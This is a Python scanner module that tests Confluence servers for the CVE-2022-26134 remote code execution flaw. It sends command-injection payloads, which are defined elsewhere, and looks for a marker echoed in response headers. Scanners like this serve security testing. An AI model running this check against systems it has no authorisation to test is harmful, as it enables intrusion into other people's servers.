#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import base64
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2022_26134_scan(self, url):
    ''' 2022年6月2日Atlassian官方发布了一则安全更新, 通告了一个严重且已在野利用的代码执行漏洞, 
        攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2022-26134'
    vul_info['vul_method'] = 'GET'

    for payload in self.cve_2022_26134_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path
        
        headers['Referer'] = 'http://' + logger.get_domain(url)

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target
        

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            res_md = "'X-Cmd-Response': '" + self.md
            res_md_2 = "'X-Confluence: '" + self.md

            if (self.md in check.check_res(res.headers.get('X-Cmd-Response', ''), self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Request': res
                }
                return results
            elif (self.md in check.check_res(base64.b64decode(res.headers.get('X-Confluence', '')).decode(), self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Response-Headers': 'X-Confluence: XXX',
                    'Response-Decode': 'Base64',
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
